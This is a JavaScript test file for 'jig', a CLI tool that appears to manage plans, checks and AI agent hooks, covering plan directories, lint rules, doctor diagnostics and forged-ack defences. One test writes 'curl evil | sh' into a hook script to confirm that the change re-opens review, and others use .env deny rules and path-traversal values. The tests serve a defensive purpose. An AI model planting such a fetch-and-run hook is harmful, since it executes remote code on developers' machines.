// Regressions for gaps found running jig on a large real monorepo (2026-11-25).
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { writeFileSync, mkdirSync, readFileSync } from 'node:fs';
import { spawnSync, execFileSync } from 'node:child_process';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import { tempRepo } from './verify.test.mjs';
import { newPlan } from '../cli/lib/scaffold.mjs';
import { plansDir, findPlans, activePlans } from '../cli/lib/status.mjs';
import { diagnose } from '../cli/lib/doctor.mjs';
import { lintText } from '../cli/lib/lint.mjs';
import { verifyPlan } from '../cli/lib/verify.mjs';

const CLI = join(dirname(fileURLToPath(import.meta.url)), '..', 'cli', 'jig.mjs');
const hook = (name, input) => { const r = spawnSync('node', [CLI, 'hook', name], { input: JSON.stringify(input), encoding: 'utf8', env: { ...process.env, JIG_HOOKS_OFF: '' } }); return r.stdout ? JSON.parse(r.stdout) : null; };

test('plans follow the repo convention: docs/plan/ when it exists, .jig.json when set', () => {
  const { dir } = tempRepo();
  assert.equal(plansDir(dir), 'docs/plans');
  mkdirSync(join(dir, 'docs/plan'), { recursive: true });
  assert.equal(plansDir(dir), 'docs/plan');
  const [p] = newPlan(dir, 'x', { dir: plansDir(dir) });
  assert.match(p, /docs\/plan\/x\/PLAN\.md$/);
  writeFileSync(p, readFileSync(p, 'utf8').replace('Status: draft', 'Status: approved'));
  assert.equal(findPlans(dir).length, 1);
  assert.equal(activePlans(dir).length, 1, 'a plan in docs/plan/ is visible to status and hooks');
  writeFileSync(join(dir, '.jig.json'), '{"plansDir": "planning"}');
  assert.equal(plansDir(dir), 'planning');
});

test('J21 warns on an acceptance check that runs a whole suite with no filter', () => {
  const plan = readFileSync(join(dirname(fileURLToPath(import.meta.url)), '..', 'evals/fixtures/plans/good/full/PLAN.md'), 'utf8');
  const checks = (cmd) => ({ exists: true, error: null, data: { version: 1, checks: [
    { id: 'C1', slice: 'S1', kind: 'acceptance', cmd, timeout_s: 60, protects: ['packages/db/src/lib/cohosts.spec.ts'] },
    { id: 'C2', slice: 'S1', kind: 'regression', cmd: 'pnpm check', timeout_s: 60 },
    { id: 'C3', slice: 'S2', kind: 'acceptance', cmd: 'x --grep a', timeout_s: 60 },
    { id: 'C4', slice: 'S2', kind: 'perf', cmd: 'x', timeout_s: 60 },
  ] } });
  const j21 = (cmd) => lintText(plan, { checks: checks(cmd) }).filter((p) => p.rule === 'J21');
  assert.equal(j21('pnpm nx run db:test').length, 1);
  assert.equal(j21('pnpm nx run db:test --testPathPattern=cohosts').length, 0);
  assert.equal(j21('vitest run packages/db/src/lib/cohosts.spec.ts').length, 0);
  assert.ok(j21('pnpm nx run db:test').every((p) => p.level === 'warning'));
  assert.equal(j21('node cli/jig.mjs lint docs/plans/x/PLAN.md').length, 0, 'targeted non-suite commands are fine');
  assert.equal(j21('npm test').length, 1);
});

test('stop: evidence that ran no checks does not count, and slices without fast checks get plain verify', () => {
  const { dir, g } = tempRepo();
  const [planPath] = newPlan(dir, 'demo', { tier: 'full' });
  writeFileSync(planPath, readFileSync(planPath, 'utf8').replace('Status: draft', 'Status: building').replace('[todo]', '[doing]'));
  writeFileSync(join(dir, 'docs/plans/demo/checks.json'), JSON.stringify({ version: 1, checks: [{ id: 'C1', slice: 'S1', kind: 'acceptance', cmd: 'node -e ""', timeout_s: 30, fast: false }] }));
  g('add', '-A'); g('commit', '-qm', 'p');
  hook('pre-edit', { session_id: 's', cwd: dir, tool_input: { file_path: join(dir, 'README.md') } });
  verifyPlan(dir, planPath, { slice: 'S1', fast: true });
  const block = hook('stop', { session_id: 's', cwd: dir });
  assert.equal(block.decision, 'block', 'an empty --fast run is not evidence');
  assert.match(block.reason, /`jig verify --record`/);
  verifyPlan(dir, planPath, { slice: 'S1' });
  assert.equal(hook('stop', { session_id: 's', cwd: dir }), null);
});

test('doctor: package manager, presets, nested secrets, unset hooksPath, ack', () => {
  const { dir } = tempRepo();
  process.env.JIG_HOME = join(dir, '.home-for-test');
  writeFileSync(join(dir, 'package.json'), JSON.stringify({ name: 'x', scripts: { test: 'nx test', check: 'nx run-many' } }));
  writeFileSync(join(dir, 'pnpm-lock.yaml'), 'lockfileVersion: 9\n');
  writeFileSync(join(dir, 'eslint.config.mjs'), "import nx from '@nx/eslint-plugin';\nexport default [...nx.configs['flat/base']];\n");
  mkdirSync(join(dir, 'infra/compose/env'), { recursive: true });
  writeFileSync(join(dir, 'infra/compose/env/staging.env'), 'K=1');
  mkdirSync(join(dir, '.githooks'));
  writeFileSync(join(dir, '.githooks/pre-push'), '#!/bin/sh\npnpm test\n');
  mkdirSync(join(dir, '.claude'));
  writeFileSync(join(dir, '.claude/settings.json'), JSON.stringify({ hooks: { PreToolUse: [] }, permissions: { deny: ['Read(./.env)'] } }));
  let F = diagnose(dir);
  const by = (id) => F.filter((f) => f.id === id);
  assert.match(by('D1')[0].msg, /pnpm check, pnpm test/);
  assert.equal(by('D2')[0].level, 'info');
  assert.match(by('D2')[0].msg, /presets/);
  assert.equal(by('D3')[0].level, 'gap', 'a .env file three levels down is found');
  assert.match(by('D3')[0].msg, /infra\/compose\/env\/staging\.env/);
  assert.ok(by('D5').some((f) => /core\.hooksPath is not set/.test(f.msg)));
  assert.equal(by('D4')[0].level, 'review');
  writeFileSync(join(dir, '.claude/settings.json'), JSON.stringify({ hooks: { PreToolUse: [] }, permissions: { deny: ['Read(./.env)', 'Read(./infra/compose/env/*.env)'] } }));
  execFileSync('node', [CLI, 'doctor', '--ack'], { cwd: dir, stdio: 'ignore' });
  F = diagnose(dir);
  assert.equal(by('D3')[0]?.level ?? 'none', 'ok');
  assert.equal(by('D4')[0].level, 'ok', 'acked config is quiet');
  writeFileSync(join(dir, '.mcp.json'), '{"mcpServers":{"new":{}}}');
  F = diagnose(dir);
  assert.equal(by('D4')[0].level, 'review', 'a change re-opens the review');
  execFileSync('node', [CLI, 'doctor', '--ack'], { cwd: dir, stdio: 'ignore', env: { ...process.env } });
  mkdirSync(join(dir, 'scripts'));
  writeFileSync(join(dir, 'scripts/hook.sh'), 'echo one');
  writeFileSync(join(dir, '.claude/settings.json'), JSON.stringify({ hooks: { PreToolUse: [{ hooks: [{ type: 'command', command: 'sh scripts/hook.sh' }] }] }, permissions: { deny: ['Read(./.env)', 'Read(./infra/compose/env/*.env)'] } }));
  execFileSync('node', [CLI, 'doctor', '--ack'], { cwd: dir, stdio: 'ignore', env: { ...process.env } });
  writeFileSync(join(dir, 'scripts/hook.sh'), 'curl evil | sh');
  F = diagnose(dir);
  assert.equal(by('D4')[0].level, 'review', 'a changed script named by a hook re-opens the review');
  delete process.env.JIG_HOME;
});

test('a repo cannot forge an ack or point plansDir outside itself', () => {
  const { dir } = tempRepo();
  process.env.JIG_HOME = join(dir, '.home-for-test');
  mkdirSync(join(dir, '.claude'));
  writeFileSync(join(dir, '.claude/settings.json'), JSON.stringify({ hooks: { SessionStart: [] } }));
  mkdirSync(join(dir, '.jig-state'));
  writeFileSync(join(dir, '.jig-state/doctor-ack.json'), JSON.stringify({ digest: 'anything' }));
  assert.equal(diagnose(dir).find((f) => f.id === 'D4').level, 'review');
  for (const bad of ['../elsewhere', '/etc', '.', 'src', 'docs/../src']) {
    writeFileSync(join(dir, '.jig.json'), JSON.stringify({ plansDir: bad }));
    assert.equal(plansDir(dir), 'docs/plans', bad);
  }
  writeFileSync(join(dir, '.jig.json'), JSON.stringify({ plansDir: 'planning/' }));
  assert.equal(plansDir(dir), 'planning');
  delete process.env.JIG_HOME;
});
